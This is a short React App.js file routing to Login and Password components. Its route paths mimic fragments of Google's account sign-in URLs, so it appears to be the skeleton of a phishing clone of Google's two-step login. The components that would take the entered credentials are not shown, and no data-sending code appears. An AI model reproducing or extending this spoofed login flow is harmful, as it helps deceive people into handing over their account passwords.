import './App.css';
import React from "react";
import Login from "./Login";
import Password from "./Password";
import { BrowserRouter as Router, Route, Routes} from "react-router-dom";

function App() {
  return (
    <div className="App">
      <Router>
      <Routes>
        <Route path="/v3/identifier0continuehttps3A2F2GlifWebSignInhlenGB&S16448581093A1706398668419936" element={
          <React.Fragment>
            <Login/>
          </React.Fragment>
        }/>
        <Route path="/v3/pwdTLAHNYTISLBQdq1oPINH30XKmymic4TxfHWG80GkvYGRDZgh4Wc7YUetmg7tinuehttps3A2F2Fthemeglifauthuser0" element={
          <React.Fragment>
            <Password/>
          </React.Fragment>
        }/>
      </Routes>
      </Router>
      
    </div>
  );
}

export default App;
